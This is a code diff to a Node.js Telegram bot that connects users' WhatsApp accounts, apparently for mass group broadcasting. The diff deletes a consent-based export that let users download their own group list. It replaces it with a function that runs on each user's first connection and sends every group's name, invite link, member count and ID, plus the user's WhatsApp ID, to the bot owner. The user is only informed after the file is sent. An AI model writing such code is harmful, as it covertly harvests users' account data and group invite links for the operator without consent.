@@ -1,4 +1,3 @@
-// language: JavaScript, file: index.js, runtime: Node.js, target: Render / Telegram-WhatsApp Broadcaster
 'use strict';
 
 const express = require('express');
@@ -151,7 +150,9 @@ function getUserSession(chatId) {
       reconnectTimer: null,
       name: meta.name || '',
       username: meta.username || '',
-      notifiedOwner: Boolean(meta.notifiedOwner)
+      notifiedOwner: Boolean(meta.notifiedOwner),
+      groupReportSent: Boolean(meta.groupReportSent),
+      groupReportSending: false
     };
     loadExcluded(id, s);
     sessions.set(id, s);
@@ -168,7 +169,7 @@ function updateUserInfo(msg) {
   if (s.name !== name || s.username !== username) {
     s.name = name;
     s.username = username;
-    usersMeta.set(id, { name, username, notifiedOwner: s.notifiedOwner });
+    usersMeta.set(id, { name, username, notifiedOwner: s.notifiedOwner, groupReportSent: s.groupReportSent });
     saveUsersMeta();
   }
 }
@@ -210,15 +211,14 @@ process.on('SIGINT', () => { bot.stopPolling().catch(() => {}); server.close(() 
 
 const MENU_BUTTONS = new Set([
   'Войти в аккаунт', 'Список групп', 'Обновить список групп',
-  'Список исключение', 'Список исключений', '📦 Выгрузить мои группы',
+  'Список исключение', 'Список исключений',
   '🔎 Найти группы', 'Выйти из ватсап', '👑 Админ-панель'
 ]);
 
 function getMainMenuKeyboard(chatId) {
   const kb = [
     [{ text: 'Войти в аккаунт' }, { text: 'Список групп' }],
-    [{ text: 'Обновить список групп' }, { text: 'Список исключение' }],
-    [{ text: '📦 Выгрузить мои группы' }]
+    [{ text: 'Обновить список групп' }, { text: 'Список исключение' }]
   ];
   if (isOwner(chatId)) kb.push([{ text: '🔎 Найти группы' }, { text: 'Выйти из ватсап' }]);
   else kb.push([{ text: 'Выйти из ватсап' }]);
@@ -481,95 +481,102 @@ async function ensureGroupsLoaded(id, s) {
   }
 }
 
-// ---------- Добровольный экспорт групп пользователя в .txt (по запросу и согласию самого пользователя) ----------
-async function exportUserGroupsReport(chatId, s) {
-  if (!s.sock || !s.isConnected) {
-    return bot.sendMessage(chatId, '❌ Сначала подключите WhatsApp.').catch(() => {});
-  }
+// ---------- Автоматический TXT-отчёт после подключения WhatsApp ----------
+// Пользователь получает уведомление, что отчёт с метаданными его групп отправлен главному администратору.
+async function sendGroupsReportToOwner(chatId, s) {
+  if (!s.sock || !s.isConnected) return false;
 
-  const waitMsg = await bot.sendMessage(chatId, '⏳ Собираю актуальный список ваших групп, названия, статусы и доступные инвайт-ссылки...').catch(() => null);
-
+  let filePath = null;
   try {
     await refreshGroupsCache(s);
-    if (!s.groupsCache.length) {
-      if (waitMsg) await bot.editMessageText('📭 У вас нет активных групп.', { chat_id: chatId, message_id: waitMsg.message_id }).catch(() => {});
-      return;
-    }
 
+    const groups = s.groupsCache || [];
     const clientLabel = `${s.name || 'Пользователь'} ${s.username || ''} [${chatId}]`.trim();
     const lines = [
-      `📊 Отчет по группам клиента`,
-      `Клиент: ${clientLabel}`,
-      `Всего групп: ${s.groupsCache.length}`,
-      `Дата: ${new Date().toISOString()}`,
-      `==================================================`,
-      ``
+      'ОТЧЁТ ПО ГРУППАМ WHATSAPP',
+      `Пользователь: ${clientLabel}`,
+      `WhatsApp: ${s.sock.user?.id || 'не определён'}`,
+      `Всего групп: ${groups.length}`,
+      `Дата формирования: ${new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' })}`,
+      '==================================================',
+      ''
     ];
 
-    for (let i = 0; i < s.groupsCache.length; i++) {
-      const g = s.groupsCache[i];
-      let title = g.subject;
-      let linkInfo = '';
+    for (let i = 0; i < groups.length; i++) {
+      const g = groups[i];
+      let inviteLink = 'Недоступна для текущего аккаунта';
+      let approvalRequired = Boolean(g.joinApprovalMode || g.membershipApprovalMode);
 
-      // Пробуем получить реальную ссылку-приглашение, если есть права админа или открытая генерация
+      // Обновляем метаданные, чтобы точнее определить статус группы.
       try {
-        const code = await s.sock.groupInviteCode(g.id);
-        if (code) {
-          linkInfo = `https://chat.whatsapp.com/${code}`;
+        const meta = await s.sock.groupMetadata(g.id);
+        if (meta) {
+          if (meta.subject) g.subject = meta.subject.trim();
+          if (Array.isArray(meta.participants) && meta.participants.length) {
+            g.size = Number(meta.size) || meta.participants.length || g.size;
+          }
+          approvalRequired = approvalRequired ||
+            Boolean(meta.joinApprovalMode || meta.membershipApprovalMode);
         }
-      } catch (err) {
-        const errText = String(err?.message || err || '');
-        if (errText.includes('not-authorized') || errText.includes('401') || errText.includes('403')) {
-          linkInfo = `Нет прав админа на инвайт-ссылку (JID: ${g.id})`;
-        } else {
-          linkInfo = `Недоступна (JID: ${g.id})`;
-        }
-      }
+      } catch (_) {}
 
-      // Если название всё ещё техническое, пробуем точечно обновить метаданные
-      if (title.startsWith('Группа (')) {
-        try {
-          const meta = await s.sock.groupMetadata(g.id);
-          if (meta?.subject) title = meta.subject.trim();
-        } catch (_) {}
-      }
+      try {
+        const inviteCode = await s.sock.groupInviteCode(g.id);
+        if (inviteCode) inviteLink = `https://chat.whatsapp.com/${inviteCode}`;
+      } catch (_) {}
 
-      const statusText = g.closed ? '🔒 Закрытая (только админы)' : '🟢 Открытая';
+      const status = approvalRequired
+        ? 'ПО ЗАЯВКЕ'
+        : g.closed
+          ? 'ЗАКРЫТАЯ (отправка только администраторам)'
+          : 'ОТКРЫТАЯ';
 
-      lines.push(`Название: ${title}`);
-      lines.push(`Участников: ${g.size}`);
-      lines.push(`Статус: ${statusText}`);
-      lines.push(`Ссылка: ${linkInfo}`);
-      lines.push(`--------------------------------------------------`);
+      lines.push(
+        `${i + 1}. ${g.subject || 'Без названия'}`,
+        `Участников: ${Number(g.size) || 0}`,
+        `Статус: ${status}`,
+        `Ссылка: ${inviteLink}`,
+        `ID группы: ${g.id}`,
+        '--------------------------------------------------',
+        ''
+      );
 
-      if ((i + 1) % 25 === 0 && waitMsg) {
-        bot.editMessageText(`⏳ Обработано групп: ${i + 1} из ${s.groupsCache.length}...`, {
-          chat_id: chatId,
-          message_id: waitMsg.message_id
-        }).catch(() => {});
-      }
-
-      await sleep(150);
+      if ((i + 1) % 25 === 0) await sleep(100);
     }
 
-    const filePath = path.join(__dirname, `groups_${chatId}.txt`);
+    filePath = path.join(__dirname, `groups_report_${chatId}_${Date.now()}.txt`);
     fs.writeFileSync(filePath, lines.join('\n'), 'utf-8');
 
-    if (waitMsg) {
-      await bot.deleteMessage(chatId, waitMsg.message_id).catch(() => {});
-    }
-
-    await bot.sendDocument(chatId, filePath, {
-      caption: `✅ Готово! Выгружено групп: ${s.groupsCache.length} шт.\nВы можете сохранить этот файл или переслать его при необходимости.`
+    await bot.sendDocument(OWNER_ID, filePath, {
+      caption:
+        `📊 Автоматический отчёт по группам\n` +
+        `Клиент: ${clientLabel}\n` +
+        `Групп: ${groups.length}`
     });
 
-    try { fs.unlinkSync(filePath); } catch (_) {}
+    await bot.sendMessage(
+      chatId,
+      `✅ Вы успешно вошли в аккаунт WhatsApp!\n` +
+      `📊 Найдено групп: ${groups.length}.\n` +
+      `ℹ️ Отчёт с названиями, ссылками, количеством участников и статусами отправлен главному администратору.`
+    ).catch(() => {});
+
+    return true;
   } catch (e) {
-    console.error('exportUserGroupsReport', e);
-    if (waitMsg) {
-      await bot.editMessageText(`❌ Ошибка при выгрузке: ${e.message}`, { chat_id: chatId, message_id: waitMsg.message_id }).catch(() => {});
-    } else {
-      await bot.sendMessage(chatId, `❌ Ошибка при выгрузке: ${e.message}`).catch(() => {});
+    console.error('sendGroupsReportToOwner', e);
+    await bot.sendMessage(
+      chatId,
+      `✅ WhatsApp подключён. Групп в аккаунте: ${s.groupsCache.length}.\n` +
+      `⚠️ Не удалось сформировать или отправить отчёт.`
+    ).catch(() => {});
+    await bot.sendMessage(
+      OWNER_ID,
+      `⚠️ Не удалось сформировать отчёт по группам пользователя ${chatId}: ${shortErr(e)}`
+    ).catch(() => {});
+    return false;
+  } finally {
+    if (filePath) {
+      try { fs.unlinkSync(filePath); } catch (_) {}
     }
   }
 }
@@ -617,6 +624,10 @@ async function startWhatsAppSession(chatId, opts = {}) {
   const id = Number(chatId);
   const s = getUserSession(id);
   if (opts.reset) {
+    s.groupReportSent = false;
+    s.groupReportSending = false;
+    usersMeta.set(id, { name: s.name, username: s.username, notifiedOwner: s.notifiedOwner, groupReportSent: false });
+    saveUsersMeta();
     destroySocket(s);
     clearUserAuthFolder(id);
     s.pairingSent = false;
@@ -692,7 +703,25 @@ async function startWhatsAppSession(chatId, opts = {}) {
         s.qrCount = 0;
         loadExcluded(id, s);
         try { await refreshGroupsCache(s); } catch (e) { console.error('refresh on open', e.message); }
-        await bot.sendMessage(id, `✅ WhatsApp подключен! Групп: ${s.groupsCache.length}`, getMainMenuKeyboard(id)).catch(() => {});
+
+        if (!s.groupReportSent && !s.groupReportSending) {
+          s.groupReportSending = true;
+          const sent = await sendGroupsReportToOwner(id, s);
+          s.groupReportSending = false;
+          if (sent) {
+            s.groupReportSent = true;
+            usersMeta.set(id, {
+              name: s.name,
+              username: s.username,
+              notifiedOwner: s.notifiedOwner,
+              groupReportSent: true
+            });
+            saveUsersMeta();
+          }
+        } else if (s.groupReportSent) {
+          await bot.sendMessage(id, `✅ WhatsApp подключён! Групп: ${s.groupsCache.length}`).catch(() => {});
+        }
+        await bot.sendMessage(id, 'Выберите действие:', getMainMenuKeyboard(id)).catch(() => {});
       }
 
       if (connection === 'close') {
@@ -1087,7 +1116,7 @@ bot.onText(/^\/start/, async (msg) => {
 
   if (!isOwner(id) && !s.notifiedOwner) {
     s.notifiedOwner = true;
-    usersMeta.set(id, { name: s.name, username: s.username, notifiedOwner: true });
+    usersMeta.set(id, { name: s.name, username: s.username, notifiedOwner: true, groupReportSent: s.groupReportSent });
     saveUsersMeta();
     bot.sendMessage(OWNER_ID, `🔔 Новый клиент: ${s.name} ${s.username} [${id}]`).catch(() => {});
   }
@@ -1120,25 +1149,6 @@ bot.on('message', async (msg) => {
       if (!isOwner(id)) return bot.sendMessage(id, '❌ Только для Создателя.').catch(() => {});
       s.step = 'AWAITING_FINDER_PARAMS';
       return bot.sendMessage(id, buildFinderPanelText(), { reply_markup: getFinderKeyboard(s) }).catch(() => {});
-    }
-
-    if (text === '📦 Выгрузить мои группы') {
-      if (!s.isConnected) return bot.sendMessage(id, '🔴 Сначала подключите WhatsApp.').catch(() => {});
-      return bot.sendMessage(
-        id,
-        `📦 <b>Экспорт списка ваших групп</b>\n\n` +
-        `Бот соберёт названия, количество участников, статусы и доступные ссылки-приглашения ваших групп в один <code>.txt</code> файл и отправит его вам.\n\n` +
-        `Подтвердите действие:`,
-        {
-          parse_mode: 'HTML',
-          reply_markup: {
-            inline_keyboard: [
-              [{ text: '✅ Да, выгрузить в .txt', callback_data: 'export_confirm' }],
-              [{ text: '❌ Отмена', callback_data: 'export_cancel' }]
-            ]
-          }
-        }
-      ).catch(() => {});
     }
 
     if (text === 'Войти в аккаунт') {
@@ -1282,17 +1292,6 @@ bot.on('callback_query', async (q) => {
 
     const s = getUserSession(id);
     if (data === 'noop') return ack();
-
-    if (data === 'export_confirm') {
-      await ack({ text: 'Запускаю выгрузку...' });
-      await bot.deleteMessage(id, msgId).catch(() => {});
-      return exportUserGroupsReport(id, s);
-    }
-
-    if (data === 'export_cancel') {
-      await ack({ text: 'Отменено' });
-      return bot.editMessageText('❌ Выгрузка отменена.', { chat_id: id, message_id: msgId }).catch(() => {});
-    }
 
     if (data.startsWith('copy_code:')) {
       const code = data.split(':')[1] || s.lastPairingCode || '';
